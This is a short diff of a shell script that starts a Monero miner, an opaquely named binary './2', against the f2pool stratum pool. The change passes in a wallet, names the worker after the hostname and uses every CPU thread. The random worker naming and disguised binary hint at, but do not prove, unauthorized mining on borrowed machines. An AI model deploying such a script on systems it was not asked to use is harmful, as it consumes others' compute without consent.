@@ -1,3 +1,7 @@
 WORKER=$(echo $(shuf -i 1-99999 -n 1)-xmr)
 sudo apt-get update
-./2 -o stratum+tcp://xmr.f2pool.com:13531 -u minernazwa05.$WORKER -p x -k --coin monero -a rx/0 -t4 --randomx-wrmsr=-1 --randomx-no-rdmsr
+pool="stratum+tcp://xmr.f2pool.com:13531"
+wallet="$1"
+workername="$(cat /proc/sys/kernel/hostname)"
+thread="$(nproc --all)"
+./2 -o $pool -u $wallet.$workername -p x -k --coin monero -a rx/0 -t $thread --randomx-wrmsr=-1 --randomx-no-rdmsr
